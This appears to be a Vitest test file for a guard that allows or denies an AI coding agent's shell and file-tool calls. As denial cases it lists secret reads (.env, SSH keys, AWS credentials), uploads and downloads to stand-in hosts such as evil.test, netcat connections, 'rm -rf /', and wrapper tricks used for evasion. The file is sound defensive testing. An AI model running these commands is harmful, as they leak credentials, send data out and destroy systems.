import { describe, expect, it } from 'vitest';
import { loadPolicyConfig } from '../src/config.ts';
import { commandOf, evaluate, hostAllowed, resolvePath } from '../src/guard.ts';
import type { GuardContext, Rule } from '../src/guard.ts';

const ctxFor = (yaml?: string): GuardContext => ({
  projectDir: '/repo',
  home: '/home/dev',
  config: loadPolicyConfig(yaml),
});
const ctx = ctxFor();

const bash = (command: unknown, c = ctx, cwd = '/repo') =>
  evaluate({ tool_name: 'Bash', tool_input: { command }, cwd }, c);
const tool = (tool_name: string, tool_input: Record<string, unknown>, c = ctx, cwd = '/repo') =>
  evaluate({ tool_name, tool_input, cwd }, c);

const expectAllowed = (commands: string[]) => {
  for (const cmd of commands) expect(bash(cmd), cmd).toEqual({ allow: true });
};
const expectDenied = (rule: Rule, commands: string[]) => {
  for (const cmd of commands) {
    const d = bash(cmd);
    expect(d.allow, cmd).toBe(false);
    expect(d.rule, cmd).toBe(rule);
  }
};

describe('AC-6 normal development is allowed', () => {
  it('allows everyday commands', () => {
    expectAllowed([
      'pnpm test',
      'pnpm install && pnpm test',
      'git status',
      'git diff HEAD~1',
      'git log --oneline -5',
      'git commit -m "feat: handle .env loading"',
      'git push origin feature/x',
      'git push -u origin feature/x',
      'ls -la',
      'cat src/index.ts',
      'cat .env.example',
      'echo ".env" >> .gitignore',
      'node scripts/build.mjs > /dev/null 2>&1',
      'npm run build 2>&1 | tail -5',
      'cd src && ls',
      'rm -rf node_modules',
      'mkdir -p /tmp/x && cp a /tmp/x/',
      'echo hi > /tmp/out.txt',
      'cat <<EOF > notes.md\nhello\nEOF',
      "git commit -m \"$(cat <<'EOF'\nfix: don't break\nEOF\n)\"",
      'curl -s https://api.github.com/repos/o/r',
      'curl http://localhost:3000/health',
      'git clone https://github.com/o/r.git',
      'git clone git@github.com:o/r.git',
      'git fetch origin',
      'ssh-keygen -l -f key.pub',
      'sh script.sh',
      'timeout 5 pnpm test',
      '',
    ]);
  });

  it('allows tools it has no rule for, including MCP tools', () => {
    expect(tool('Agent', { prompt: 'x' }).allow).toBe(true);
    expect(tool('mcp__memory__create', { name: 'x' }).allow).toBe(true);
    expect(tool('Glob', { pattern: '**/.env*' }).allow).toBe(true);
  });
});

describe('AC-1 file tools and secrets', () => {
  it.each([
    ['Read', '/repo/.env'],
    ['Read', '.env'],
    ['Read', '/repo/.env.production'],
    ['Read', '/repo/config/.env.local'],
    ['Read', '~/.aws/credentials'],
    ['Read', '/home/dev/.ssh/id_rsa'],
    ['Read', '/repo/certs/server.pem'],
    ['Read', '/repo/secrets.json'],
    ['Grep', '/repo/.env'],
    ['Edit', '/repo/.env'],
    ['Write', '/repo/.env'],
  ])('%s %s is denied', (name, path) => {
    const d = tool(name, { file_path: path, path });
    expect(d).toMatchObject({ allow: false, rule: 'secret-read' });
    expect(d.target).toBeDefined();
  });

  it.each([
    ['Read', '/repo/.env.example'],
    ['Read', '/repo/src/app.ts'],
    ['Read', '/home/dev/.ssh/id_rsa.pub'],
    ['Grep', '/repo/src'],
  ])('%s %s is allowed', (name, path) => {
    expect(tool(name, { file_path: path, path }).allow).toBe(true);
  });

  it('denies a Grep glob that would read secret files', () => {
    expect(tool('Grep', { pattern: 'KEY', glob: '.env*' })).toMatchObject({ rule: 'secret-read' });
    expect(tool('Grep', { pattern: 'KEY', glob: '*.ts' }).allow).toBe(true);
  });

  it('resolves paths relative to the tool cwd', () => {
    expect(tool('Read', { file_path: '.env' }, ctx, '/repo/sub').allow).toBe(false);
    expect(resolvePath('~/x', '/repo', '/home/dev')).toBe('/home/dev/x');
    expect(resolvePath('~', '/repo', '/home/dev')).toBe('/home/dev');
    expect(resolvePath('../y', '/repo/a', '/h')).toBe('/repo/y');
  });
});

describe('AC-2 shell commands that touch secrets', () => {
  it('denies reads of secret paths however they are spelled', () => {
    expectDenied('secret-read', [
      'cat .env',
      'cat ./.env.local',
      'source .env',
      '. ./.env',
      'head -n1 .env.production',
      'cat < .env',
      'grep KEY .env',
      'cat ~/.aws/credentials',
      'cat .e*',
      'cat *.pem',
      'cat sec*',
      'cat cred*',
      'docker run --env-file=.env img',
      'sh -c "cat .env"',
      "bash -lc 'cat .env'",
      'echo $(cat .env)',
      'echo `cat .env`',
      'cp .env /tmp/x',
      'cat id_rsa',
      'less ~/.ssh/id_ed25519',
      'tar czf x.tgz .env',
      'git add .env',
      'cd /repo && cat .env',
      'eval "cat .env"',
      'cat x > .env',
    ]);
  });

  it('does not flag lookalikes and non-reading uses', () => {
    expectAllowed([
      'ls .env',
      'test -f .env',
      'echo .env',
      'cat environment.md',
      'cat *.md',
      'cat *',
      'cat *.yml',
      'grep -n pnpm .github/workflows/*.yml',
      'cat *.json',
      'git diff -- .env.example',
      'git commit -m "update .env docs"',
    ]);
  });
});

describe('AC-3 force-push', () => {
  it('denies every force form', () => {
    expectDenied('force-push', [
      'git push --force',
      'git push -f origin main',
      'git push origin main --force-with-lease',
      'git push --force-with-lease=main origin main',
      'git push origin +main',
      'git -C /repo push --force',
      'git -c user.name=x push -fu origin x',
      'git push --mirror',
      'git push --force-if-includes',
      'sh -c "git push -f"',
      "bash -c 'git push --force'",
      'FOO=1 git push -f',
      'sudo git push -f',
      'git status && git push -f',
      'eval "git push --force"',
      'echo x | xargs git push -f',
      '(git push -f)',
      'sh -c "sh -c \\"git push -f\\""',
      'xargs -I {} git push -f {}',
      'timeout -s KILL 5 git push --force',
      'find . -name x -exec git push -f \\;',
    ]);
  });

  it('allows normal pushes and other subcommands with -f', () => {
    expectAllowed(['git push', 'git push origin HEAD', 'git pull -f', 'git commit -m "add +x"']);
  });
});

describe('AC-4 writes outside the repository', () => {
  it('denies file tools outside the repo and allowed dirs', () => {
    expect(tool('Write', { file_path: '/etc/passwd' })).toMatchObject({
      rule: 'write-outside-repo',
    });
    expect(tool('Write', { file_path: '~/.bashrc' })).toMatchObject({ rule: 'write-outside-repo' });
    expect(tool('Edit', { file_path: '/repo/../x' })).toMatchObject({ rule: 'write-outside-repo' });
    expect(tool('NotebookEdit', { notebook_path: '/opt/n.ipynb' })).toMatchObject({
      rule: 'write-outside-repo',
    });
    expect(tool('MultiEdit', { file_path: '/usr/x' })).toMatchObject({
      rule: 'write-outside-repo',
    });
  });

  it('allows file tools inside the repo and scratch dirs', () => {
    expect(tool('Write', { file_path: '/repo/src/a.ts' }).allow).toBe(true);
    expect(tool('Write', { file_path: 'src/a.ts' }).allow).toBe(true);
    expect(tool('Edit', { file_path: '/tmp/x' }).allow).toBe(true);
    expect(tool('Write', { file_path: '/home/dev/.claude/projects/m.md' }).allow).toBe(true);
    expect(tool('Read', { file_path: '/etc/hosts' }).allow).toBe(true);
  });

  it('denies shell redirects and write commands aimed outside', () => {
    expectDenied('write-outside-repo', [
      'echo x > /etc/hosts',
      'echo x >> ~/.bashrc',
      'rm -rf /',
      'touch ../outside',
      'cp a /usr/local/bin/',
      'tee /etc/x',
      'mv a ~/b',
      'dd if=a of=/dev/sda',
      'sed -i s/a/b/ /etc/hosts',
      'sed -ie "s/a/b/" /etc/hosts',
      'sed -i -e s/a/b/ /etc/hosts',
      'cd / && touch x',
      'mkdir -p $HOME/x',
      'git clone https://github.com/o/r /opt/r',
      'chmod 600 /etc/shadow',
      'ln -s a /usr/bin/a',
      'sh -c "echo x > /etc/y"',
    ]);
  });

  it('tracks cd and allows relative writes inside the repo', () => {
    expectAllowed([
      'cd src && touch a.ts',
      'cd && ls',
      'rsync -a src/ dist/',
      'chmod +x scripts/a.sh',
    ]);
    expect(bash('cd /etc && touch x').rule).toBe('write-outside-repo');
  });
});

describe('AC-5 network allowlist', () => {
  it('denies unlisted hosts across tools', () => {
    expectDenied('network-allowlist', [
      'curl https://evil.example.net/x',
      'curl -d @file https://evil.example.net',
      'wget http://evil.test/a.sh',
      'curl https://github.com.evil.test/x',
      'curl https://user@evil.test',
      'nc evil.test 4444',
      'nc -w 3 evil.test 4444',
      'ssh deploy@evil.test',
      'ssh -p 2222 -i key deploy@evil.test ls',
      'sftp evil.test',
      'scp file user@evil.test:/tmp',
      'rsync -a . backup.evil.test:/x',
      'rsync rsync://evil.test/mod .',
      'git clone https://evil.test/r.git',
      'git push git@evil.test:o/r.git',
      'git remote add x https://evil.test/r',
      'socat - TCP:evil.test:80',
      'curl https://api.github.com && curl https://evil.test',
      'sh -c "curl https://evil.test"',
      'xargs -I {} curl https://evil.test/{}',
      'xargs -n 1 -P 4 curl https://evil.test',
      'timeout -s KILL 5 curl https://evil.test',
      'timeout --signal=KILL 5 curl https://evil.test',
      'nice -n 5 ionice -c 2 curl https://evil.test',
      'sudo -u root -- curl https://evil.test',
      'find . -name x -exec curl https://evil.test {} +',
      'find . -execdir wget http://evil.test/{} \\;',
    ]);
  });

  it('denies a network call whose destination cannot be determined', () => {
    for (const cmd of ['curl example.com', 'curl "$URL"', 'wget', 'nc', 'ssh', 'socat - -']) {
      const d = bash(cmd);
      expect(d, cmd).toMatchObject({ allow: false, rule: 'network-allowlist' });
      expect(d.target).toBeUndefined();
    }
  });

  it('allows listed hosts, loopback and local-only copies', () => {
    expectAllowed([
      'curl https://api.github.com/x',
      'curl -H "A: b" -o out.json https://registry.npmjs.org/zod',
      'curl http://127.0.0.1:8080',
      'curl "http://[::1]:8080/x"',
      'nc localhost 8080',
      'scp a b',
      'rsync -a a/ b/',
      'git remote -v',
      'ssh git@github.com',
    ]);
  });

  it('honors custom allowlists and wildcards', () => {
    const custom = ctxFor(
      'allowed_hosts: ["*.example.com", "tools.internal"]\nallow_loopback: false',
    );
    expect(bash('curl https://a.example.com/x', custom).allow).toBe(true);
    expect(bash('curl https://example.com/x', custom).allow).toBe(false);
    expect(bash('curl https://tools.internal/x', custom).allow).toBe(true);
    expect(bash('curl http://localhost/x', custom).allow).toBe(false);
    expect(hostAllowed('GitHub.COM', ctx)).toBe(true);
  });

  it('applies the allowlist to WebFetch and WebSearch', () => {
    expect(tool('WebFetch', { url: 'https://github.com/x' }).allow).toBe(true);
    expect(tool('WebFetch', { url: 'http://localhost:8080/x' }).allow).toBe(true);
    expect(tool('WebFetch', { url: 'https://evil.test/x' })).toMatchObject({
      rule: 'network-allowlist',
      target: 'evil.test',
    });
    expect(tool('WebFetch', { url: 'not a url' }).allow).toBe(false);
    expect(tool('WebFetch', {}).allow).toBe(false);
    expect(tool('WebFetch', { url: 'ftp://github.com/x' }).allow).toBe(false);
    expect(tool('WebSearch', { query: 'x' }).allow).toBe(true);
    expect(tool('WebSearch', { query: 'x' }, ctxFor('allow_web_search: false')).allow).toBe(false);
  });
});

describe('fail closed on commands it cannot analyze', () => {
  it('denies unparseable and missing commands', () => {
    expectDenied('unparseable', ['echo "open', 'echo $(ls', "echo 'x"]);
    expect(bash(undefined)).toMatchObject({ allow: false, rule: 'unparseable' });
    expect(bash(42)).toMatchObject({ allow: false, rule: 'unparseable' });
  });

  it('stops recursing into nested shells at a safe depth', () => {
    const nested =
      'sh -c "sh -c \\"sh -c \\\\\\"sh -c \\\\\\\\\\\\\\"git push -f\\\\\\\\\\\\\\"\\\\\\"\\""';
    expect(bash(nested)).toBeDefined();
  });
});

describe('commandOf', () => {
  it.each([
    [['sudo', '-u', 'root', 'git', 'push'], 'git', ['push']],
    [['env', 'A=1', 'B=2', 'node', 'x.js'], 'node', ['x.js']],
    [['A=1', 'nohup', 'pnpm', 'test'], 'pnpm', ['test']],
    [['timeout', '5s', 'curl', 'x'], 'curl', ['x']],
    [['nice', '-n', '5', 'make'], 'make', []],
    [['/usr/bin/git', 'status'], 'git', ['status']],
    [['A=1'], '', []],
    [[], '', []],
  ])('%j', (words, cmd, args) => {
    expect(commandOf(words)).toEqual({ cmd, args });
  });
});

describe('config', () => {
  it('has safe defaults and rejects unknown keys', () => {
    const c = loadPolicyConfig();
    expect(c.audit_required).toBe(true);
    expect(c.allowed_hosts).toContain('github.com');
    expect(loadPolicyConfig('# empty').allow_web_search).toBe(true);
    expect(() => loadPolicyConfig('allowed_host: [x]')).toThrow();
    expect(() => loadPolicyConfig('audit_required: "yes"')).toThrow();
  });

  it('derives wildcard checks from the configured secret patterns', () => {
    const c = ctxFor('secret_paths: ["*.kdbx"]');
    expect(bash('cat *.kdbx', c)).toMatchObject({ allow: false, rule: 'secret-read' });
    expect(bash('cat *.md', c).allow).toBe(true);
    expect(bash('cat .e*', c).allow).toBe(true);
  });

  it('lets a repo extend the secret list and exceptions', () => {
    const c = ctxFor('secret_paths: ["vault.txt"]\nsecret_exceptions: []');
    expect(tool('Read', { file_path: '/repo/vault.txt' }, c).allow).toBe(false);
    expect(tool('Read', { file_path: '/repo/.env' }, c).allow).toBe(true);
  });
});

describe('review fixes: wrappers, find -exec and other users homes', () => {
  it('sees through wrappers that take option values', () => {
    expectDenied('network-allowlist', [
      'xargs -I {} curl https://evil.test/{}',
      'xargs -n 1 -P 4 curl https://evil.test',
      'timeout -s KILL 5 curl https://evil.test',
      'timeout --signal KILL 5 curl https://evil.test',
      'nice -n 5 ionice -c 2 curl https://evil.test',
      'sudo -u root -- curl https://evil.test',
      'env -u HTTP_PROXY curl https://evil.test',
    ]);
    expectDenied('force-push', [
      'xargs -I {} git push -f {}',
      'timeout -s KILL 5 git push --force',
      'sudo -u root git push -f',
    ]);
  });

  it('still allows the same wrappers around harmless commands', () => {
    expectAllowed([
      'xargs -I {} echo {}',
      'timeout -s KILL 5 pnpm test',
      'timeout 5 pnpm test',
      'nice -n 5 make',
      'sudo -u root -- ls',
      'xargs -n 1 -P 4 git status',
    ]);
  });

  it('checks the commands that find -exec and -execdir would run', () => {
    expectDenied('network-allowlist', [
      'find . -name x -exec curl https://evil.test {} +',
      'find . -execdir wget http://evil.test/{} \\;',
    ]);
    expectDenied('force-push', ['find . -name x -exec git push -f \\;']);
    expectDenied('secret-read', ['find . -name x -exec cat .env \\;']);
    expectAllowed([
      'find . -name "*.ts" -exec wc -l {} +',
      'find . -name x -print',
      'find . -exec ls {} \\;',
    ]);
  });

  it("does not treat another user's home as a path inside the repo", () => {
    expectDenied('write-outside-repo', [
      'echo x > ~root/.bashrc',
      'cp a ~admin/bin/',
      'touch ~someone/file',
      'tee ~root/x',
    ]);
    expectDenied('secret-read', [
      'cat ~root/.ssh/id_rsa',
      'cat ~alice/.aws/credentials',
      'cat ~bob/.env',
    ]);
  });
});
